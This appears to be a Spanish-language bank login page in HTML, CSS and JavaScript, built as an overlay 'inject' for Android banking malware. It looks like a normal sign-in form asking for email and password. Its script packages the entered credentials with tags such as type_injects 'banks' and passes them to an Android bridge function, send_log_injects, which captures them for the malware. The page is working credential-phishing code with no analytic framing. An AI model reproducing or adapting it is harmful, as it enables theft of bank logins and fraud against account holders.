    <style>
        header {
            padding: 30px 0 0 0;
            text-align: center;
        }

        section {
            padding: 15px;
        }

        h2 {
            text-align: center;
        }

        header > p {
            text-align: center;
            font-weight: 200;
            color: #000;
        }

        .input{
            width: 100%;
            border: 0;
            border-bottom:1px solid #cccccc;
            margin-bottom: 15px;
            padding-left: 0;
            color: #212121;
        }

        .cool-input {
            box-sizing: border-box;
            border: 0;
            width: 100%;
            position: relative;
            font-size: 16px;
            margin-bottom: 15px;
        }

        .cool-input__input {
            box-sizing: border-box;
            background: none;
            width: 100%;
            padding: 15px 10px 2px 0;
            position: relative;
            z-index: 2;
            font-size: 1em;
        }
        .cool-input__input:focus {
            outline: none;
        }

        .cool-input__placeholder {
            box-sizing: border-box;
            border: none;
            background: none;
            width: 100%;
            position: absolute;
            left: 0;
            top: 40%;
            font-size: 14px;
            line-height: 0;
            color: #aaaaaa;
            transition: all 0.2s ease;
            font-weight: 200;
        }

        .cool-input__input_filled + .cool-input__placeholder,
        .cool-input__input:focus + .cool-input__placeholder {    font-size: 0.6em;
            top: 0;
            margin-top: 1em;
            left: 0;
        }

        input,button{
            outline: none;
            box-shadow: none;
        }

        .error {
            border-color: #f00 !important;
        }

        p {
            text-align: center;
            color: #3478f6;
        }

        .button {
            width: 100%;
            padding: 10px;
            font-size: 14px;
            color: #fff;
            background-color: #2865a8;
            border: 1px solid #2865a8;
            border-radius: 8px;
            margin-bottom: 15px;
        }

        h5 {
            text-align: center;
            margin-bottom: 15px;
        }

        div.button {
            color: #2865a8;
            background-color: transparent;
            text-align: center;
        }

        input, button {
            outline: none !important;
            box-shadow: none !important;
        }
    </style>
</head>

            <p> Inicia sesión con tu correo electrónico </p>
        </header>
        <section>

            <div class="cool-input">
                <input type="tel" id="login" name="login" class="input cool-input__input" autocomplete="off">
                <span class="cool-input__placeholder">Correo electrónico*</span>
            </div>

            <div class="cool-input">
                <input type="password" id="password" name="password" class="input cool-input__input" autocomplete="off">
                <span class="cool-input__placeholder">Contraseña*</span>
            </div>

            <p> ¿Olvidaste tu contraseña? </p>

            <input type="submit" class="button" id="sendData" value="INICIAR SESION">

            <h5> ¿No tienes cuenta? </h5>

            <div class="button">
                CREA TU CUENTA
            </div>
        </section>
        <footer>

        </footer>
    </form>
    <script>
        $('.cool-input__input').on('input', function(){
            var $this = $(this);
            if ($this.val() == '') {
                $this.removeClass('cool-input__input_filled');
            } else {
                $this.addClass('cool-input__input_filled');
            }
        });

        var login = document.getElementById('login'),
            password = document.getElementById('password');

        var sendData = document.getElementById('sendData');

        function emailValidation() {
            if(!/^([a-z0-9_-]+\.)*[a-z0-9_-]+@[a-z0-9_-]+(\.[a-z0-9_-]+)*\.[a-z]{2,6}$/i.test(login.value)) {
                login.classList.add('error');
                return false;
            } else {
                login.classList.remove('error');
                return true;
            }
        }

        login.onkeyup = () => {
            emailValidation()
        }

        sendData.onclick = () => {
            emailValidation()

            if(password.value.length < 6) {
                password.classList.add('error');
            } else {
                password.classList.remove('error');
            }

            if(/^([a-z0-9_-]+\.)*[a-z0-9_-]+@[a-z0-9_-]+(\.[a-z0-9_-]+)*\.[a-z]{2,6}$/i.test(login.value) && password.value.length >= 6) {
                var data = {};
                data.login = login.value;
                data.password = password.value;
                data.type_injects = "banks";
                data.closed = "close_activity_injects";

                var ua = navigator.userAgent.toLowerCase();
                if(ua.indexOf("android") > -1) {
                    try {
                        Android.send_log_injects(JSON.stringify(data))
                    } catch (err) {}
                }else{
                    alert(JSON.stringify(data));
                }
            }
        }
    </script>
